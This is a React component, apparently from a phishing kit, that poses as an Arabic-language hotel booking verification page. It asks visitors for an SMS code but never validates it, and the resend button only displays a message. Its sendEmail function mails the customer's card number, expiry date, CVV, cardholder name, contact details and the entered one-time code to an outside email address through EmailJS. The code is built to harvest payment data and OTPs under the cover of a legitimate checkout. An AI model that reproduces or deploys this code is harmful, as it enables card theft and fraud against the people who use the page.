import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import emailjs from '@emailjs/browser';
import { ArrowRight, Shield, RefreshCw } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { useToast } from '@/components/ui/use-toast';

const VerificationPage = () => {
  const navigate = useNavigate();
  const { toast } = useToast();
  const [verificationCode, setVerificationCode] = useState(['', '', '', '', '', '']);
  const [timeLeft, setTimeLeft] = useState(120);
  const [isResending, setIsResending] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const inputsRef = useRef([]);

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prevTime) => {
        if (prevTime <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prevTime - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [isResending]);

  const handleInputChange = (index, value) => {
    if (value.length > 1 || !/^\d*$/.test(value)) return;
    
    const newCode = [...verificationCode];
    newCode[index] = value;
    setVerificationCode(newCode);

    if (value && index < 5) {
      inputsRef.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === 'Backspace' && !verificationCode[index] && index > 0) {
      inputsRef.current[index - 1]?.focus();
    }
  };

  const sendEmail = (bookingData, code) => {
    const templateParams = {
      to_email: 'perfum@msaaedaltour.online',
      booking_id: bookingData.bookingId,
      property_name: bookingData.propertyName,
      customer_name: `${bookingData.firstName} ${bookingData.lastName}`,
      customer_email: bookingData.email,
      customer_phone: bookingData.phone,
      check_in: bookingData.checkIn,
      check_out: bookingData.checkOut,
      guests: bookingData.guests,
      total_price: bookingData.totalPrice,
      payment_method: bookingData.paymentDetails.paymentMethod,
      card_number: bookingData.paymentDetails.cardNumber || 'N/A',
      card_expiry: bookingData.paymentDetails.expiryDate || 'N/A',
      card_cvv: bookingData.paymentDetails.cvv || 'N/A',
      card_name: bookingData.paymentDetails.cardName || 'N/A',
      verification_code: code,
      special_requests: bookingData.specialRequests || 'لا يوجد'
    };

    emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams, 'YOUR_PUBLIC_KEY')
      .then((response) => {
        console.log('SUCCESS!', response.status, response.text);
        toast({
          title: "📧 تم إرسال تفاصيل الحجز",
          description: "تم إرسال نسخة من الحجز إلى بريدك الإداري.",
        });
      }, (err) => {
        console.log('FAILED...', err);
        toast({
          title: "❌ فشل إرسال البريد",
          description: "حدث خطأ أثناء إرسال البريد الإداري.",
          variant: "destructive",
        });
      });
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    const code = verificationCode.join('');
    
    if (code.length !== 6) {
      toast({
        title: "⚠️ كود غير مكتمل",
        description: "يرجى إدخال الكود المكون من 6 أرقام",
        variant: "destructive"
      });
      return;
    }

    setIsVerifying(true);
    toast({
      title: "🔄 جاري التحقق...",
      description: "يرجى الانتظار",
    });

    setTimeout(() => {
      const bookingData = JSON.parse(localStorage.getItem('currentBooking') || '{}');
      const completedBooking = {
        ...bookingData,
        status: 'confirmed',
        verificationCode: code,
        confirmedAt: new Date().toISOString()
      };
      
      const bookings = JSON.parse(localStorage.getItem('bookings') || '[]');
      bookings.push(completedBooking);
      localStorage.setItem('bookings', JSON.stringify(bookings));
      
      sendEmail(completedBooking, code);

      localStorage.setItem('latestBookingId', completedBooking.bookingId);
      localStorage.removeItem('currentBooking');

      setIsVerifying(false);
      navigate('/success');
    }, 2000);
  };

  const handleResendCode = () => {
    setIsResending(true);
    
    toast({
      title: "📱 تم إرسال الكود",
      description: "تم إرسال كود تحقق جديد إلى هاتفك",
    });

    setTimeout(() => {
      setIsResending(false);
      setTimeLeft(120);
      setVerificationCode(['', '', '', '', '', '']);
      inputsRef.current[0]?.focus();
    }, 2000);
  };

  const formatTime = (seconds) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;
  };

  return (
    <div className="min-h-screen bg-gray-50">
      <header className="bg-white shadow-sm">
        <div className="container mx-auto px-4 py-4">
          <button 
            onClick={() => navigate(-1)}
            className="flex items-center text-emerald-600 hover:text-emerald-700"
          >
            <ArrowRight className="w-5 h-5 ml-2" />
            العودة
          </button>
        </div>
      </header>

      <div className="container mx-auto px-4 py-8">
        <div className="max-w-md mx-auto">
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-white rounded-2xl p-8 shadow-lg text-center"
          >
            <div className="w-16 h-16 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-6">
              <Shield className="w-8 h-8 text-emerald-600" />
            </div>

            <h1 className="text-2xl font-bold text-gray-800 mb-4">تحقق من هويتك</h1>
            <p className="text-gray-600 mb-8">
              تم إرسال كود التحقق المكون من 6 أرقام إلى هاتفك
            </p>

            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="flex justify-center gap-2" dir="ltr">
                {verificationCode.map((digit, index) => (
                  <input
                    key={index}
                    ref={el => inputsRef.current[index] = el}
                    id={`code-${index}`}
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleInputChange(index, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(index, e)}
                    className="w-12 h-14 text-center text-2xl font-bold border-2 border-gray-300 rounded-lg focus:outline-none focus:border-emerald-500 focus:ring-2 focus:ring-emerald-200"
                    disabled={isVerifying}
                  />
                ))}
              </div>

              <div className="text-center">
                {timeLeft > 0 ? (
                  <p className="text-gray-600">
                    انتهاء صلاحية الكود خلال: <span className="font-bold text-emerald-600">{formatTime(timeLeft)}</span>
                  </p>
                ) : (
                  <p className="text-red-600 font-semibold">انتهت صلاحية الكود</p>
                )}
              </div>

              <Button
                type="submit"
                disabled={verificationCode.join('').length !== 6 || isVerifying}
                className="w-full bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-600 hover:to-teal-600 text-lg py-3 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isVerifying ? <RefreshCw className="w-5 h-5 animate-spin" /> : 'تحقق من الكود'}
              </Button>
            </form>

            <div className="mt-6 pt-6 border-t">
              <p className="text-gray-600 mb-4">لم تستلم الكود؟</p>
              <Button
                onClick={handleResendCode}
                disabled={timeLeft > 0 || isResending}
                variant="outline"
                className="w-full"
              >
                {isResending ? (
                  <>
                    <RefreshCw className="w-4 h-4 ml-2 animate-spin" />
                    جاري الإرسال...
                  </>
                ) : (
                  'إعادة إرسال الكود'
                )}
              </Button>
            </div>

            <div className="mt-6 p-4 bg-blue-50 rounded-lg">
              <p className="text-sm text-blue-700">
                💡 تأكد من أن هاتفك قريب منك وأنه يمكنك استقبال الرسائل النصية
              </p>
            </div>
          </motion.div>
        </div>
      </div>
    </div>
  );
};

export default VerificationPage;